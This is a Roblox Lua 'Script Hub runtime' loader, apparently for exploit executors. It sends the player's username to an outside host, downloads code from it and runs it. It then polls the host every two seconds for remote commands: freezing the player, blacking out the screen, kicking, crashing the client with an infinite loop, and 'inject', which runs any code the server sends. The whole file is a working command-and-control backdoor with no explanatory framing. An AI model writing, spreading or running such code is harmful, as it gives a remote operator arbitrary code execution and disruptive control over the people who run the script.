-- Script Hub runtime
local SLUG = "ca0c179d57d5"
local KEY  = "trial"
local BASE = "https://fluxus-forge.lovable.app"

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local StarterGui = game:GetService("StarterGui")
local Lighting = game:GetService("Lighting")

local function LP()
  local p = Players.LocalPlayer
  if not p then p = Players.PlayerAdded:Wait() end
  return p
end
local player = LP()
local USER = player.Name

local function urlenc(s)
  return (tostring(s):gsub("([^%w_%-%.~])", function(c)
    return string.format("%%%02X", string.byte(c))
  end))
end

local function httpget(u)
  local ok, res = pcall(function() return game:HttpGet(u, true) end)
  if ok then return res end
  return nil
end

-- Fetch real code
local codeUrl = BASE .. "/api/code/" .. SLUG
  .. "?key=" .. urlenc(KEY) .. "&u=" .. urlenc(USER)
local code = httpget(codeUrl)
if not code or #code < 1 or code:sub(1,5) == "<!DOC" then return end

_G.SCRIPT_HUB = _G.SCRIPT_HUB or {}
local SH = _G.SCRIPT_HUB
SH.stopped = false

local function freeze()
  local ch = player.Character or player.CharacterAdded:Wait()
  local hrp = ch:FindFirstChild("HumanoidRootPart")
  local hum = ch:FindFirstChildWhichIsA("Humanoid")
  if hrp then hrp.Anchored = true end
  if hum then hum.WalkSpeed = 0; hum.JumpPower = 0; hum.JumpHeight = 0 end
  SH.frozen = true
end
local function unfreeze()
  local ch = player.Character
  if ch then
    local hrp = ch:FindFirstChild("HumanoidRootPart")
    local hum = ch:FindFirstChildWhichIsA("Humanoid")
    if hrp then hrp.Anchored = false end
    if hum then hum.WalkSpeed = 16; hum.JumpPower = 50; hum.JumpHeight = 7.2 end
  end
  SH.frozen = false
end
local function black()
  if SH.blackout then return end
  local cc = Instance.new("ColorCorrectionEffect")
  cc.Name = "SH_BLACK"; cc.Brightness = -1; cc.Contrast = -1; cc.Saturation = -1
  cc.Parent = Lighting
  SH.blackout = cc
end
local function unblack()
  if SH.blackout then SH.blackout:Destroy() end
  SH.blackout = nil
  for _, v in ipairs(Lighting:GetChildren()) do
    if v.Name == "SH_BLACK" then v:Destroy() end
  end
end
local function notify(text)
  text = tostring(text or "")
  pcall(function() StarterGui:SetCore("SendNotification", { Title = "Script Hub", Text = text, Duration = 6 }) end)
  pcall(function() StarterGui:SetCore("ChatMakeSystemMessage", { Text = "[Script Hub] " .. text, Color = Color3.fromRGB(0, 240, 255) }) end)
end

local handlers = {
  freeze    = freeze,
  unfreeze  = unfreeze,
  black     = black,
  unblack   = unblack,
  stop      = function() SH.stopped = true end,
  resume    = function() SH.stopped = false end,
  kick      = function(p) player:Kick(p or "Kicked by Script Hub") end,
  crash     = function() task.spawn(function() while true do end end) end,
  message   = notify,
  broadcast = notify,
  inject    = function(p) if p and #p > 0 then task.spawn(function() local f = loadstring(p); if f then pcall(f) end end) end end,
  restart   = function() player:Kick("Restarting…") end,
  shutdown  = function() player:Kick("Shutdown") end,
  ban       = function() player:Kick("Banned") end,
}

-- Run user code
task.spawn(function()
  local fn = loadstring(code)
  if fn then pcall(fn) end
end)

-- Heartbeat + command polling (every 2s)
task.spawn(function()
  while true do
    local pollUrl = BASE .. "/api/poll/" .. SLUG .. "?u=" .. urlenc(USER)
    local raw = httpget(pollUrl)
    if raw and #raw > 0 and raw ~= "[]" then
      local ok, list = pcall(function() return HttpService:JSONDecode(raw) end)
      if ok and type(list) == "table" then
        for _, cmd in ipairs(list) do
          local h = handlers[cmd.command]
          if h then pcall(h, cmd.payload) end
        end
      end
    end
    task.wait(2)
  end
end)
